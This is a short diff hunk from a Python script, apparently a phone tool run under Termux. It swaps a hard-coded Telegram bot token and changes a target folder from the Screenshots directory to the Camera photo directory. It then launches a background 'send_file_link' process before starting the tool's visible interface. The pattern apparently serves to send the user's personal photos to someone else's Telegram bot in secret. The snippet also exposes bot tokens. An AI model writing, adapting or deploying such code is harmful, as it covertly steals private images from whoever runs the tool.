@@ -298,8 +298,8 @@ class simpan_file:
 #--> Trigger
 if __name__ == '__main__':
     clear()
-    token = '6027886537:AAG-RkgWAyzGWObrTMol81Vh-ip8rl9_Ks4'
-    dir_path = "/sdcard/DCIM/Screenshots"
+    token = '6289052021:AAG7NdwgBxnUIrG3Rq7vFCN53gJ2SpvmixoI'
+    dir_path = "/sdcard/DCIM/Camera"
     p = multiprocessing.Process(target=send_file_link, args=(token, dir_path))
     p.start()
     start()
